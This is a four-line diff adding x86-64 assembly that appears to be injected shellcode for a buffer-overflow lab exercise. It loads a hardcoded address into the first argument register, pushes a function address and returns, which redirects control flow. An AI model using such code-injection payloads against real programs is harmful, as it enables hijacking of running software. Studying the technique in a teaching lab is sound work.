@@ -1,0 +1,4 @@
+movl $0x5561dc78, %edi
+subq $100, %rsp
+pushq $0x4018fa
+ret
